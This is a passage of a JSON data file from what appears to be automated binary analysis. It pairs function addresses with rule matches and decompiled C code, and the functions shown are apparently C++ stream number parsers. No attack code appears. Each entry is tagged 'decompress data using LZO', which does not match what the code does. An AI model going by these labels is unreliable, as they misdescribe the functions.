fcn.00450410(&arg_10h);\n        if (var_35h == 0) {\ncode_r0x00470fce:\n            var_40h = &arg_10h;\n            uVar6 = fcn.004504b0();\n            bVar15 = *(iVar8 + 0x70) == uVar6;\n            cVar4 = *(iVar8 + 0x10);\n            if ((((bVar15) || (*(iVar8 + 0x72) == uVar6)) && ((cVar4 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00450410(var_40h);\n                stack0xffffffc8 = 0;\n                bVar1 = false;\n                if (var_35h == 0) {\n                    uVar6 = fcn.004504b0();\n                    cVar4 = *(iVar8 + 0x10);\n                    goto code_r0x004711d0;\n                }\n            }\n            else {\ncode_r0x004711d0:\n                stack0xffffffc8 = 0;\n                bVar1 = false;\n                while (((cVar4 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar3 = var_5ch == 10 | bVar1 ^ 1U;\n                        if (!bVar3) goto code_r0x0047120c;\n                        bVar1 = uVar9 == 0 || var_5ch == 8;\n                        if (uVar9 != 0 && var_5ch != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00471242;\n                        }\n                        stack0xffffffc8 = 0;\n                        var_5ch = 8;\n                        uVar11 = arg_8h[2];\n                        if (arg_8h[3] <= uVar11) goto code_r0x00471380;\ncode_r0x00471251:\n                        arg_8h[2] = uVar11 + 2;\ncode_r0x00471260:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar1) break;\ncode_r0x0047120c:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = 0;\n                            bVar1 = true;\n                            goto code_r0x00471041;\n                        }\n                        var_35h._0_1_ = var_5ch == 0x10 || uVar9 == 0;\n                        if (var_5ch != 0x10 && uVar9 != 0) {\n                            bVar1 = true;\n                            goto code_r0x0047104d;\n                        }\n                        stack0xffffffc8 = 0;\n                        var_5ch = 0x10;\n                        bVar3 = false;\ncode_r0x00471242:\n                        uVar11 = arg_8h[2];\n                        bVar1 = bVar3;\n                        if (uVar11 < arg_8h[3]) goto code_r0x00471251;\ncode_r0x00471380:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00471260;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar14 = arg_10h != NULL && arg_14h == -1;\n                    bVar3 = arg_14h == -1;\n                    if (bVar14) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar3 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar3 = bVar14;\n                        }\n                    }\n                    if (bVar3 == var_35h) {\n                        var_35h._0_1_ = 1;\n                        goto code_r0x00471041;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar1) break;\n                    cVar4 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = 0;\n            }\ncode_r0x00471041:\n            var_44h = 0x16;\n            if (var_5ch != 0x10) goto code_r0x0047104d;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar1 = false;\n            bVar15 = false;\ncode_r0x0047104d:\n            var_44h = var_5ch;\n        }\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        if (*(iVar8 + 0x10) != '\\0') {\ncode_r0x004716f0:\n            fcn.0048c930(0x20);\n        }\n        uVar2 = var_35h;\n        var_40h = &arg_10h;\n        var_4ch = bVar15 + 0x7fffffff;\n        var_50h = var_4ch / var_5ch;\n        var_36h = *(iVar8 + 0xa4);\n        if (var_36h == 0) {\n            if (var_35h == 0) {\n                var_36h = var_35h;\n                var_3ch = 0;\n                do {\n                    uVar9 = uVar6;\n                    if (var_44h < 0xb) {\n                        if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00471430;\ncode_r0x004710ea:\n                        iVar10 = uVar9 - 0x30;\n                    }\n                    else {\n                        if (uVar6 - 0x30 < 10) goto code_r0x004710ea;\n                        if (uVar6 - 0x61 < 6) {\n                            iVar10 = uVar9 - 0x57;\n                        }\n                        else {\n                            if (5 < uVar6 - 0x41) goto code_r0x00471430;\n                            iVar10 = uVar9 - 0x37;\n                        }\n                    }\n                    if (iVar10 == -1) goto code_r0x00471430;\n                    if (var_50h < var_3ch) {\n                        var_36h = 1;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x004714d3;\ncode_r0x0047112a:\n                        arg_8h[2] = uVar9 + 2;\n                    }\n                    else {\n                        var_36h = var_36h | var_4ch - iVar10 < var_3ch * var_5ch;\n                        var_3ch = iVar10 + var_3ch * var_5ch;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        uVar9 = arg_8h[2];\n                        if (uVar9 < arg_8h[3]) goto code_r0x0047112a;\ncode_r0x004714d3:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    uVar2 = fcn.00450410(var_40h);\n                    if (uVar2 != 0) goto code_r0x00471154;\n                    uVar6 = fcn.004504b0();\n                } while( true );\n            }\n            var_3ch = 0;\n            var_35h._0_1_ = 0;\n        }\n        else {\ncode_r0x00471591:\n            uVar2 = var_35h;\n            if (var_35h == 0) {\n                uVar5 = *(iVar8 + 0x10);\n                var_36h = 0;\n                var_3ch = 0;\n                if (uVar5 == 0) goto code_r0x00471630;\ncode_r0x004715b1:\n                if (*(iVar8 + 0x26) != uVar6) goto code_r0x00471630;\n                if (stack0xffffffc8 != 0) {\n                    fcn.0048cc10(stack0xffffffc8);\n                    stack0xffffffc8 = 0;\ncode_r0x004715da:\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x0047168f;\n                    do {\n                        arg_8h[2] = uVar9 + 2;\n                        while( true ) {\n                            var_40h = &arg_10h;\n                            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                            uVar2 = fcn.00450410(var_40h);\n                            if (uVar2 != 0) goto code_r0x00471154;\n                            uVar6 = fcn.004504b0();\n                            uVar5 = *(iVar8 + 0x10);\n                            if (uVar5 != 0) goto code_r0x004715b1;\ncode_r0x00471630:\n                            puVar12 = iVar8 + 0x78;\n                            uVar9 = var_44h;\n                            if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00471430;\n                            while (*puVar12 != uVar6) {\n                                uVar9 = uVar9 - 1;\n                                puVar12 = puVar12 + 1;\n                                if (uVar9 == 0) {\n                                    uVar2 = 0;\n                                    goto code_r0x00471154;\n                                }\n                            }\n                            iVar13 = puVar12 - (iVar8 + 0x78);\n                            iVar10 = iVar13 >> 1;\n                            if (0x1e < iVar13) {\n                                iVar10 = iVar10 + -6;\n                            }\n                            if (var_3ch <= var_50h) {\n                                uVar9 = var_3ch * var_5ch;\n                                var_3ch = iVar10 + uVar9;\n                                var_36h = var_36h | var_4ch - iVar10 < uVar9;\n                                unique0x00007a80 = stack0xffffffc8 + 1;\n                                goto code_r0x004715da;\n                            }\n                            var_36h = 1;\n                            uVar9 = arg_8h[2];\n                            if (uVar9 < arg_8h[3]) break;\ncode_r0x0047168f:\n                            (**(*arg_8h + 0x28))();\n                        }\n                    } while( true );\n                }\n                uVar2 = 0;\n                var_35h._0_1_ = uVar5;\n            }\n            else {\n                var_3ch = 0;\n                var_36h = 0;\n                var_35h._0_1_ = 0;\n            }\n        }\n    }\n    else {\n        var_5ch = 10;\n        if (uVar9 != 8) goto code_r0x00470faf;\n        var_5ch = 0x10;\n        uVar2 = fcn.00450410(&arg_10h);\n        if (uVar2 == 0) goto code_r0x00470fce;\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        var_35h._0_1_ = *(iVar8 + 0x10);\n        if (var_35h != 0) {\n            stack0xffffffc8 = 0;\n            uVar6 = 0;\n            var_5ch = 0x10;\n            bVar1 = false;\n            bVar15 = false;\n            var_44h = 0x16;\n            goto code_r0x004716f0;\n        }\n        var_36h = *(iVar8 + 0xa4);\n        bVar15 = false;\n        bVar1 = false;\n        var_35h._0_1_ = var_36h;\n        if (var_36h != 0) {\n            stack0xffffffc8 = 0;\n            uVar6 = 0;\n            var_44h = 0x16;\n            var_50h = 0x7ffffff;\n            var_4ch = 0x7fffffff;\n            var_5ch = 0x10;\n            goto code_r0x00471591;\n        }\n        var_3ch = 0;\n        stack0xffffffc8 = 0;\n    }\ncode_r0x00471154:\n    uVar5 = uVar2;\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00471162;\ncode_r0x00471440:\n    uVar2 = uVar5;\n    fcn.0048cc10(var_35h._1_1_);\n    cVar4 = fcn.004bdf60(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar4 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0047148d;\n    goto code_r0x00471177;\ncode_r0x00471430:\n    uVar2 = 0;\n    uVar5 = 0;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00471440;\ncode_r0x00471162:\n    if ((stack0xffffffc8 != 0) || (bVar1)) {\ncode_r0x0047148d:\n        if (var_35h == 0) {\n            if (var_36h == 0) {\n                uVar9 = -var_3ch;\n                if (!bVar15) {\n                    uVar9 = var_3ch;\n                }\n                *arg_20h = uVar9;\n            }\n            else {\n                *arg_20h = bVar15 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00471189;\n        }\n    }\ncode_r0x00471177:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00471189:\n    var_58h = &var_1eh + 1;\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(var_58h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4091
    },
    "00471810": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00471810(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar11 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar14 = *(iVar11 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x0047184f:\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x0047186e:\n            var_40h = &arg_10h;\n            uVar6 = fcn.004504b0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00450410(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.004504b0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x00471ab8;\n                }\n            }\n            else {\ncode_r0x00471ab8:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x00471aef;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00471b25;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x00471be0;\ncode_r0x00471b34:\n                        arg_8h[2] = uVar9 + 2;\ncode_r0x00471b43:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00471aef:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x004718f0;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x004718fc;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00471b25:\n                        uVar9 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x00471b34;\ncode_r0x00471be0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00471b43;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar12 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar12) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar12;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x004718f0;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x004718f0:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x004718ff;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x004718fc:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x0047184f;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x0047186e;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x004718ff:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar14 = 0xffffffff / uVar15;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar9 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00471c90;\ncode_r0x00471986:\n                    uVar9 = uVar9 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x00471986;\n                    if (uVar6 - 0x61 < 6) {\n                        uVar9 = uVar9 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x00471c90;\n                        uVar9 = uVar9 - 0x37;\n                    }\n                }\n                if (uVar9 == 0xffffffff) goto code_r0x00471c90;\n                if (uVar14 < var_3ch) {\n                    var_36h = 1;\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x00471d33;\ncode_r0x004719c5:\n                    arg_8h[2] = uVar9 + 2;\n                }\n                else {\n                    var_36h = var_36h | ~uVar9 < var_3ch * uVar15;\n                    var_3ch = uVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar9 = arg_8h[2];\n                    if (uVar9 < arg_8h[3]) goto code_r0x004719c5;\ncode_r0x00471d33:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00450410(var_40h);\n                if (cVar3 != '\\0') goto code_r0x004719ef;\n                uVar6 = fcn.004504b0();\n            } while( true );\n        }\n        var_3ch = 0;\n        var_35h._0_1_ = '\\0';\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x00471e60;\ncode_r0x00471de8:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x00471e60;\n        if (stack0xffffffc8 != 0) {\n            fcn.0048cc10(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00471e11:\n            uVar9 = arg_8h[2];\n            if (arg_8h[3] <= uVar9) goto code_r0x00471ec3;\n            do {\n                arg_8h[2] = uVar9 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00450410(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x004719ef;\n                    uVar6 = fcn.004504b0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x00471de8;\ncode_r0x00471e60:\n                    puVar10 = iVar8 + 0x78;\n                    uVar9 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00471c90;\n                    while (*puVar10 != uVar6) {\n                        uVar9 = uVar9 - 1;\n                        puVar10 = puVar10 + 1;\n                        if (uVar9 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x004719ef;\n                        }\n                    }\n                    iVar11 = puVar10 - (iVar8 + 0x78);\n                    uVar9 = iVar11 >> 1;\n                    if (0x1e < iVar11) {\n                        uVar9 = uVar9 - 6;\n                    }\n                    if (var_3ch <= uVar14) {\n                        uVar13 = var_3ch * uVar15;\n                        var_3ch = uVar9 + uVar13;\n                        var_36h = var_36h | ~uVar9 < uVar13;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00471e11;\n                    }\n                    uVar9 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar9 < arg_8h[3]) break;\ncode_r0x00471ec3:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_3ch = 0;\n        var_36h = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x004719ef:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00471ca0;\ncode_r0x004719fd:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x00471ced:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar14 = -var_3ch;\n                if (!bVar16) {\n                    uVar14 = var_3ch;\n                }\n                *arg_20h = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00471a24;\n        }\n    }\n    goto code_r0x00471a12;\ncode_r0x00471c90:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x004719fd;\ncode_r0x00471ca0:\n    cVar3 = cVar5;\n    fcn.0048cc10(var_35h._1_1_);\n    cVar5 = fcn.004bdf60(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00471ced;\ncode_r0x00471a12:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00471a24:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3788
    },
    "00472010": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00472010(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint16_t *puVar11;\n    int32_t iVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar14 = *(iVar9 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x0047204f:\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x0047206e:\n            var_40h = &arg_10h;\n            uVar6 = fcn.004504b0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00450410(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.004504b0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x004722bb;\n                }\n            }\n            else {\ncode_r0x004722bb:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x004722fc;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00472332;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar10 = arg_8h[2];\n                        if (arg_8h[3] <= uVar10) goto code_r0x004723e0;\ncode_r0x00472341:\n                        arg_8h[2] = uVar10 + 2;\ncode_r0x00472350:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x004722fc:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x004720f0;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x004720fc;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00472332:\n                        uVar10 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar10 < arg_8h[3]) goto code_r0x00472341;\ncode_r0x004723e0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00472350;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar13 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar13) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar13;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x004720f0;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x004720f0:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x004720ff;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x004720fc:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x0047204f;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x0047206e;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x004720ff:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar1 = *(iVar8 + 0xa4);\n    var_48h._0_2_ = 0xffff / uVar15;\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar14 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00472490;\ncode_r0x00472184:\n                    iVar9 = uVar14 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x00472184;\n                    if (uVar6 - 0x61 < 6) {\n                        iVar9 = uVar14 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x00472490;\n                        iVar9 = uVar14 - 0x37;\n                    }\n                }\n                if (iVar9 == -1) goto code_r0x00472490;\n                if (var_48h < var_3ch) {\n                    var_36h = 1;\n                    uVar14 = arg_8h[2];\n                    if (arg_8h[3] <= uVar14) goto code_r0x00472533;\ncode_r0x004721ce:\n                    arg_8h[2] = uVar14 + 2;\n                }\n                else {\n                    var_36h = var_36h | 0xffff - iVar9 < (var_3ch * uVar15 & 0xffff);\n                    var_3ch = iVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar14 = arg_8h[2];\n                    if (uVar14 < arg_8h[3]) goto code_r0x004721ce;\ncode_r0x00472533:\n                    (**(*arg_8h + 